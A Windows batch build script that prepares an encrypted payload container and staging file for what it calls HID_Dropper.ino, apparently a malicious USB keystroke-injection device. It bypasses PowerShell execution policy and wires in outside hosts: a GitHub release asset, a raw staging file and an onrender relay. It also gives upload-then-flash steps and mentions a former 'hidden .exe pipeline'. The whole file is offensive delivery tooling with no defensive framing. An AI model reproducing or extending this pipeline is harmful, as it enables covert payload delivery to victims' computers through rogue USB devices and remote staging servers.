@echo off
REM USB_BUILD.bat - builds the encrypted delivery container (dist\assets.dat + dist\Stage.txt)
REM Replaces the old single-file hidden .exe pipeline: nothing executable is staged any more.
cd /d "%~dp0"

set ASSET_URL=https://github.com/ente1231/audiohost/releases/download/v1/assets.dat
set STAGE_URL=https://raw.githubusercontent.com/ente1231/audiohost/main/Stage.txt
set RELAY_URL=https://panic-relay.onrender.com

powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0pack.ps1" ^
  -AssetUrl "%ASSET_URL%" ^
  -StageUrl "%STAGE_URL%" ^
  -RelayUrl "%RELAY_URL%"

if errorlevel 1 (
  echo BUILD FAILED
  exit /b 1
)

echo.
echo Built:
echo   dist\assets.dat   -^> GitHub release v1 asset (overwrite)
echo   dist\Stage.txt    -^> repo ente1231/audiohost, branch main, root
echo   dist\HID.txt      -^> read only, the line for HID_Dropper.ino
echo.
echo Order matters: upload assets.dat FIRST, Stage.txt SECOND.
echo Then flash HID_Dropper.ino - STAGE_URL there is already set to %STAGE_URL%
